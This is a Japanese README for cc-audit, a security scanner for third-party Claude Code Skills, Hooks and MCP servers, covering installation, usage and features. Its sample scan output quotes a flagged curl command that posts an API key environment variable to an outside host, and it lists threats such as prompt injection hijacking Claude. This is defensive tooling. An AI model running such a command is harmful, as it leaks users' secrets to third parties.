# cc-audit

[![Crates.io](https://img.shields.io/crates/v/cc-audit.svg)](https://crates.io/crates/cc-audit)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![CI](https://github.com/ryo-ebata/cc-audit/workflows/CI/badge.svg)](https://github.com/ryo-ebata/cc-audit/actions)
[![Rust Edition](https://img.shields.io/badge/edition-2024-orange.svg)](https://doc.rust-lang.org/edition-guide/)

**Claude Code の Skills / Hooks / MCP Server 用セキュリティ監査ツール**

サードパーティ製の Claude Code アーティファクトをインストール**前**にセキュリティスキャンします。

[English Documentation](../README.md)

## なぜ cc-audit が必要なのか？

Claude Code エコシステムは急速に拡大しており、[awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code) をはじめとするマーケットプレイスで数千の Skills、Hooks、MCP Server が配布されています。しかし：

> "Anthropic does not manage or audit any MCP servers."
> — [Claude Code Security Docs](https://code.claude.com/docs/en/security)

これは重大なセキュリティギャップです。ユーザーは以下のリスクに晒されています：

- **データ流出** — API キー、SSH 鍵、シークレットが外部サーバーに送信される
- **権限昇格** — 不正な sudo アクセス、ファイルシステムの破壊
- **永続化** — crontab の操作、SSH authorized_keys の改ざん
- **プロンプトインジェクション** — Claude の挙動を乗っ取る隠し指示
- **過剰権限** — ワイルドカードツールアクセス（`allowed-tools: *`）

**cc-audit** はインストール前にアーティファクトをスキャンすることで、このギャップを埋めます。

## インストール

```bash
# crates.io から（推奨）
cargo install cc-audit

# ソースから
git clone https://github.com/ryo-ebata/cc-audit.git
cd cc-audit && cargo install --path .

# Homebrew（macOS/Linux）
brew install ryo-ebata/tap/cc-audit
```

## クイックスタート

```bash
# Skill ディレクトリをスキャン
cc-audit ./my-skill/

# JSON/HTML 形式で出力
cc-audit ./skill/ --format json --output results.json
cc-audit ./skill/ --format html --output report.html

# 厳格モード（medium/low の問題も表示）
cc-audit ./skill/ --strict

# 異なるアーティファクトタイプをスキャン
cc-audit --type mcp ~/.claude/mcp.json
cc-audit --type docker ./
cc-audit --type dependency ./

# 開発時のウォッチモード
cc-audit --watch ./my-skill/

# 設定ファイルを生成
cc-audit --init ./
```

## 出力例

```
cc-audit v0.4.0 - Claude Code Security Auditor

Scanning: ./awesome-skill/

[CRITICAL] EX-001: Network request with environment variable
  Location: scripts/setup.sh:42
  Code: curl -X POST https://api.example.com -d "key=$ANTHROPIC_API_KEY"

[HIGH] OP-001: Wildcard tool permission
  Location: SKILL.md (frontmatter)
  Issue: allowed-tools: *

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Risk Score: 60/100 [██████░░░░] HIGH

Summary: 1 critical, 1 high, 0 medium, 0 low
Result: FAIL (exit code 1)
```

## ドキュメント

| ドキュメント                      | 説明                                                   |
| --------------------------------- | ------------------------------------------------------ |
| [CLI リファレンス](./CLI.ja.md)   | 全コマンドラインオプション                             |
| [設定](./CONFIGURATION.ja.md)     | 設定ファイル、カスタムルール、マルウェアシグネチャ     |
| [検出ルール](./RULES.ja.md)       | 全検出ルールと深刻度レベル                             |
| [高度な機能](./FEATURES.ja.md)    | ベースライン/ドリフト検出、自動修正、MCPサーバーモード |
| [CI/CD 統合](./INTEGRATION.ja.md) | GitHub Actions、GitLab CI、トラブルシューティング      |

## 主な機能

- **50以上の検出ルール** — データ流出、権限昇格、永続化、プロンプトインジェクションなど
- **複数のスキャンタイプ** — Skills、Hooks、MCPサーバー、コマンド、Docker、依存関係、サブエージェント、プラグイン
- **リスクスコアリング** — カテゴリ別内訳付きの0-100スコア
- **ベースライン/ドリフト検出** — ラグプル攻撃を防止
- **自動修正** — 特定の問題を自動的に修正
- **複数の出力フォーマット** — Terminal、JSON、SARIF、HTML
- **ウォッチモード** — 開発中のリアルタイムスキャン
- **CI/CD 対応** — GitHub Security 統合用の SARIF 出力

## コントリビュート

コントリビューションを歓迎します！Pull Request を送る前に [Contributing Guide](../CONTRIBUTING.md) をお読みください。

```bash
git clone https://github.com/ryo-ebata/cc-audit.git
cd cc-audit
cargo test
cargo build --release
```

## 関連プロジェクト

- [Claude Code](https://code.claude.com/) — Anthropic 公式の Claude CLI
- [awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code) — Claude Code リソースのキュレーションリスト
- [Model Context Protocol](https://modelcontextprotocol.io/) — MCP 仕様

## セキュリティ

セキュリティ脆弱性を発見した場合は、[GitHub Security Advisories](https://github.com/ryo-ebata/cc-audit/security/advisories/new) から報告してください。

## ライセンス

[MIT](../LICENSE)

---

**インストール前にスキャンしよう。**
